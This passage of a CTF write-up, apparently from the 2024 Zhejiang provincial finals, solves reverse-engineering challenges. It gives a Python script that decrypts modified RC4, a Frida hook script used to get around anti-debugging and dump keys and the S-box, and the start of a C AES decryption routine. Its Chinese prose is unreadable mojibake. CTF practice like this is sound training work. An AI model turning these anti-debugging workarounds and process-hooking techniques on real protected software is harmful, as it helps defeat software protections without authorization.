234, 25, 63, 47, 106]</span><br></code></pre></td></tr></table></figure><p>crypto2é­”æ”¹rc4</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731225608981-03f4cabb-0132-48a1-8329-c349e944c9c8.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        char+=S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        char%=<span class="hljs-number">256</span><br>        out.append(char)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br><br>data = <span class="hljs-built_in">bytes</span>([  <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x66</span>,<br>  <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x08</span>,<br>  <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x81</span>,<br>  <span class="hljs-number">0xCF</span>])<br>key = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">105</span>, <span class="hljs-number">13</span>, <span class="hljs-number">90</span>, <span class="hljs-number">178</span>, <span class="hljs-number">64</span>, <span class="hljs-number">234</span>, <span class="hljs-number">25</span>, <span class="hljs-number">63</span>, <span class="hljs-number">47</span>, <span class="hljs-number">106</span>])<br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br><br><span class="hljs-comment">#b&#x27;flag&#123;1237-12938-9372-1923-4u92&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Re3-1"><a href="#Re3-1" class="headerlink" title="Re3-1"></a>Re3-1</h2><p>é¢˜ç›®æç¤ºdebugï¼Œä¸€å¼€å§‹tlså¾—åˆ°1.exe</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731295791640-b6d8752f-34d8-41b2-a404-86b39047ce09.png" class="" title="img"><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731291068523-66bc3109-d689-4a2d-81c8-decd297d4f02.png" class="" title="img"><p>v4åƒkeyï¼Œåé¢æ˜¯åˆ†ç»„åŠ å¯†</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731296051739-f625ee35-fd7c-4f31-802d-85e79259a039.png" class="" title="img"><p>ä¸€çœ¼aes</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731295906706-3d04359a-ef97-495e-82c4-c3e0d161665d.png" class="" title="img"><p>ä½†æ˜¯æ€ä¹ˆè§£å¯†éƒ½ä¸å¯¹ï¼Œå›å»çœ‹re3.exe</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731291025127-7611a8ca-f8c2-4646-a8af-fcbaf4bafee4.png" class="" title="img"><p>å¾—åˆ°æ ‡å‡†aesçš„sç›’</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731290990015-66007b87-f2ef-4923-9239-dcf16b080ed3.png" class="" title="img"><p>pangbaiå¸ˆå‚…çš„æ€è·¯ï¼šç”¨fridaå°è¯•å»hookï¼Œå› ä¸ºä¸ä¼šè¢«åè°ƒè¯•æ£€æµ‹</p><p>å…ˆè¿è¡ŒReverse3.exeå†æ‰§è¡Œfrida -l .\hook.js -n 1.exe</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> inter=<span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> sgame = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(<span class="hljs-string">&quot;1.exe&quot;</span>);<br>  <span class="hljs-keyword">if</span>(sgame==<span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;æ— &quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br><br>  <span class="hljs-built_in">clearInterval</span>(inter);<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&quot;</span>+sgame.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x001EC9</span>  ));<br>  <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(sgame.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x001EC9</span>  ), &#123; <br>    <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br>      <span class="hljs-keyword">var</span> rax=<span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-property">rax</span>;   <br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&quot;</span> +rax);<br>      <span class="hljs-comment">// æ£€æŸ¥å¯†æ–‡æœ‰æ²¡æœ‰è¢«ä¿®æ”¹</span><br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hexdump</span>(<span class="hljs-title function_">ptr</span>(rax),&#123;<span class="hljs-attr">length</span>: <span class="hljs-number">50</span>,<span class="hljs-attr">ansi</span>:<span class="hljs-literal">true</span>&#125;));<br><br><br>    &#125;<br>  &#125;)  <br><br>  <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(sgame.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x001E2C</span>  ), &#123;<br>    <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br><br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;input flag&quot;</span>);<br>      <span class="hljs-comment">// æ£€æŸ¥è¾“å…¥ flag çš„æ—¶å€™æœ‰æ²¡æœ‰è¢«ä¿®æ”¹</span><br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hexdump</span>(<span class="hljs-title function_">ptr</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-property">rdx</span>),&#123;<span class="hljs-attr">length</span>: <span class="hljs-number">16</span>,<span class="hljs-attr">ansi</span>:<span class="hljs-literal">true</span>&#125;));<br><br>    &#125;   <br>  &#125;)<br><br>  <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(sgame.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x1380</span>), &#123; <br>    <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br>      <span class="hljs-keyword">var</span> rdx=<span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-property">rdx</span>; <br>      <span class="hljs-comment">// æ£€æŸ¥ key ,sbox , è¿›å…¥å‡½æ•°çš„ flag æœ‰æ²¡æœ‰è¢«ä¿®æ”¹</span><br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;key&quot;</span> );<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hexdump</span>(<span class="hljs-title function_">ptr</span>(rdx),&#123;<span class="hljs-attr">length</span>: <span class="hljs-number">16</span>,<span class="hljs-attr">ansi</span>:<span class="hljs-literal">true</span>&#125;));<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;flag:&quot;</span> );<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hexdump</span>(<span class="hljs-title function_">ptr</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-property">rcx</span>),&#123;<span class="hljs-attr">length</span>: <span class="hljs-number">16</span>,<span class="hljs-attr">ansi</span>:<span class="hljs-literal">true</span>&#125;));<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;sbox:&quot;</span> );<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hexdump</span>(<span class="hljs-title function_">ptr</span>(sgame.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x5160</span>)),&#123;<span class="hljs-attr">length</span>: <span class="hljs-number">256</span>,<span class="hljs-attr">ansi</span>:<span class="hljs-literal">true</span>&#125;));<br>    &#125;<br>  &#125;)<br>&#125; , <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>input flagæœ‰å˜åŒ–è¯´æ˜è¿›å…¥aesåŠ å¯†çš„æ˜æ–‡æœ‰åç§»ï¼Œæ€»å…±33æ¬¡è°ƒç”¨sub_140001380ï¼Œå¯¹åº”3ç»„å¯†æ–‡ï¼Œæ‰€ä»¥å¯†æ–‡é•¿åº¦ä¸º48</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1763111644996-da3a2a2b-4d6d-4a73-be24-68a4875c4a32.png" class="" title="image.png"><p>è¾“å…¥0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;â€™()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_å¾—åˆ°æ–°çš„æ˜ å°„è¡¨</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1763111964574-d695e6e9-805a-4d3c-b84d-0fd0478d20d5-17631234775472.png" class="" title="image.png"><p>ä¿®æ”¹åçš„å¯†æ–‡</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1763111476446-d088d751-3f00-44b8-aa04-e7657c3a9695.png" class="" title="image.png"><p>æœ€ç»ˆè„šæœ¬</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">AddRoundKey</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *plaintext, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * CipherKey)</span><span class="hljs-comment">/* è½®å¯†é’¥åŠ  */</span><br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">16</span>; j++)  plaintext[j] = plaintext[j] ^ CipherKey[j];<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">SubBytes</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *plaintext, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *plaintextencrypt, <span class="hljs-type">int</span> count)</span><span class="hljs-comment">/*S ç›’ç½®æ¢ */</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> row, column;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> Sbox[<span class="hljs-number">16</span>][<span class="hljs-number">16</span>] = &#123;<br>      <span class="hljs-comment">/* 0     1     2     3     4     5     6     7     8     9     a     b     c     d     e     f */</span><br> <span class="hljs-number">0x63</span>,<span class="hljs-number">0x7c</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0xf2</span>,<span class="hljs-number">0x6b</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0xc5</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x2b</span>,<span class="hljs-number">0xfe</span>,<span class="hljs-number">0xd7</span>,<span class="hljs-number">0xab</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0xca</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0xc9</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0xfa</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-number">0xad</span>,<span class="hljs-number">0xd4</span>,<span class="hljs-number">0xa2</span>,<span class="hljs-number">0xaf</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0xa4</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0xc0</span>,<span class="hljs-number">0xb7</span>,<span class="hljs-number">0xfd</span>,<span class="hljs-number">0x93</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x3f</span>,<span class="hljs-number">0xf7</span>,<span class="hljs-number">0xcc</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0xa5</span>,<span class="hljs-number">0xe5</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0xd8</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0xc7</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0x96</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x9a</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xe2</span>,<span class="hljs-number">0xeb</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0xb2</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x1a</span>,<span class="hljs-number">0x1b</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x5a</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x3b</span>,<span class="hljs-number">0xd6</span>,<span class="hljs-number">0xb3</span>,<span class="hljs-number">0x29</span>,<span class="hljs-number">0xe3</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0x84</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0xd1</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xed</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0xfc</span>,<span class="hljs-number">0xb1</span>,<span class="hljs-number">0x5b</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0xcb</span>,<span class="hljs-number">0xbe</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0x4a</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0xcf</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0xef</span>,<span class="hljs-number">0xaa</span>,<span class="hljs-number">0xfb</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x4d</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x85</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0xf9</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x7f</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0x9f</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0xa3</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x8f</span>,<span class="hljs-number">0x92</span>,<span class="hljs-number">0x9d</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0xf5</span>,<span class="hljs-number">0xbc</span>,<span class="hljs-number">0xb6</span>,<span class="hljs-number">0xda</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xf3</span>,<span class="hljs-number">0xd2</span>,<span class="hljs-number">0xcd</span>,<span class="hljs-number">0x0c</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0xec</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x97</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0xc4</span>,<span class="hljs-number">0xa7</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">0x3d</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x4f</span>,<span class="hljs-number">0xdc</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x88</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0xee</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0xde</span>,<span class="hljs-number">0x5e</span>,<span class="hljs-number">0x0b</span>,<span class="hljs-number">0xdb</span>,<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x0a</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x06</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x5c</span>,<span class="hljs-number">0xc2</span>,<span class="hljs-number">0xd3</span>,<span class="hljs-number">0xac</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x91</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0xe7</span>,<span class="hljs-number">0xc8</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0xd5</span>,<span class="hljs-number">0x4e</span>,<span class="hljs-number">0xa9</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0xf4</span>,<span class="hljs-number">0xea</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x7a</span>,<span class="hljs-number">0xae</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0xba</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x2e</span>,<span class="hljs-number">0x1c</span>,<span class="hljs-number">0xa6</span>,<span class="hljs-number">0xb4</span>,<span class="hljs-number">0xc6</span>,<span class="hljs-number">0xe8</span>,<span class="hljs-number">0xdd</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x1f</span>,<span class="hljs-number">0x4b</span>,<span class="hljs-number">0xbd</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x8a</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x3e</span>,<span class="hljs-number">0xb5</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0xf6</span>,<span class="hljs-number">0x0e</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0xb9</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0xc1</span>,<span class="hljs-number">0x1d</span>,<span class="hljs-number">0x9e</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-number">0x98</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0xd9</span>,<span class="hljs-number">0x8e</span>,<span class="hljs-number">0x94</span>,<span class="hljs-number">0x9b</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0xe9</span>,<span class="hljs-number">0xce</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0xdf</span>,<span class="hljs-number">0x8c</span>,<span class="hljs-number">0xa1</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x0d</span>,<span class="hljs-number">0xbf</span>,<span class="hljs-number">0xe6</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x99</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0x0f</span>,<span class="hljs-number">0xb0</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0xbb</span>,<span class="hljs-number">0x16</span><br>        <br>        &#125;;<span class="hljs-comment">// å¡«å…… Sbox çŸ©é˜µ</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; count; i++)<br>&#123;<br>row = (plaintext[i] &amp; <span class="hljs-number">0xF0</span>) &gt;&gt; <span class="hljs-number">4</span>;<br>column = plaintext[i] &amp; <span class="hljs-number">0x0F</span>;<br>plaintextencrypt[i] = Sbox[row][column];<br>&#125;<br>&#125;<br><span 